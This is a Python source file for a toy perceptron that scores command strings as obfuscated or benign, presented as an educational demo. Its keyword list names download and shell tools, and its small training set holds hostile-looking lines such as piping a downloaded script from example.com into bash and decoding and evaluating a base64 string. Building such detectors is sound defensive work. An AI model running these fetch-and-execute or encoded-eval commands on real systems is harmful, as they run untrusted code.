# ml_obfuscation.py
# Tiny perceptron classifier to flag obfuscated / suspicious command strings.
# Educational demo only.

from typing import List
import sys

def extract_features(cmd: str) -> List[float]:
    # Features:
    #   0: length (number of characters)
    #   1: number of suspicious tokens found (like base64, powershell, wget, |, &, \x, eval, etc.)
    #   2: ratio of non-alphanumeric characters to total chars
    #   3: number of long alnum sequences (>=8) (e.g. base64 blobs)
    f = [0.0, 0.0, 0.0, 0.0]
    f[0] = float(len(cmd))

    lower = cmd.lower()
    suspicious = [
        "base64", "powershell", "wget", "curl", "|", "&", ";", "\\x",
        "eval", "fromcharcode", "atob", "cmd.exe", "/c", "exec"
    ]
    cnt = 0
    for tok in suspicious:
        if tok in lower:
            cnt += 1
    f[1] = float(cnt)

    al = 0
    nonal = 0
    for c in cmd:
        if c.isalnum():
            al += 1
        else:
            nonal += 1
    total = al + nonal
    f[2] = (nonal / total) if total > 0 else 0.0

    longseq = 0
    cur = 0
    for c in cmd:
        if c.isalnum():
            cur += 1
        else:
            if cur >= 8:
                longseq += 1
            cur = 0
    if cur >= 8:
        longseq += 1
    f[3] = float(longseq)

    return f

def dot(a: List[float], b: List[float]) -> float:
    return sum(x*y for x,y in zip(a,b))

def train_perceptron(train_set, epochs=200, lr=0.1):
    w = [0.0, 0.0, 0.0, 0.0]
    b = 0.0
    for _ in range(epochs):
        for text, label in train_set:
            x = extract_features(text)
            y_pred = dot(w, x) + b
            pred = 1 if y_pred > 0 else 0
            err = label - pred
            if err != 0:
                for i in range(len(w)):
                    w[i] += lr * err * x[i]
                b += lr * err
    return w, b

def pretty_vec(v):
    return "[" + ", ".join(f"{x:.4f}" for x in v) + "]"

def main():
    # tiny synthetic training dataset
    train = [
        ("ls -la", 0),
        ("cat /etc/passwd", 0),
        ("curl http://example.com/file.sh | bash", 1),
        ("powershell -enc SGVsbG8=", 1),
        ("echo hello", 0),
        ("cmd.exe /c whoami", 1),
        ("python -c \"print('hi')\"", 0),
        ("bash -c 'eval $(echo SGVsbG8= | base64 -d)'", 1)
    ]

    w, b = train_perceptron(train, epochs=200, lr=0.1)

    print("Trained perceptron weights:", pretty_vec(w), " bias=", f"{b:.4f}")
    print("\nEnter a command line to analyze (or pass as program arg):")

    # accept from command-line arg if present, else prompt
    if len(sys.argv) > 1:
        cmd = " ".join(sys.argv[1:])
        print(cmd)
    else:
        try:
            cmd = input().rstrip("\n")
        except EOFError:
            print("No input provided. Exiting.")
            return

    feat = extract_features(cmd)
    score = dot(w, feat) + b

    print("\nFeatures:")
    print(f"  length            = {feat[0]:.0f}")
    print(f"  suspicious tokens = {feat[1]:.0f}")
    print(f"  non-alnum ratio   = {feat[2]:.3f}")
    print(f"  long-alnum seqs   = {feat[3]:.0f}")
    print(f"\nScore = {score:.4f}")
    if score > 0:
        print("Prediction: MALICIOUS / obfuscated command (suspicious)")
    else:
        print("Prediction: Benign / not suspicious")

    print("\nNote: toy classifier trained on a tiny dataset — for real detection use large labeled datasets and proper ML pipelines.")

if __name__ == "__main__":
    main()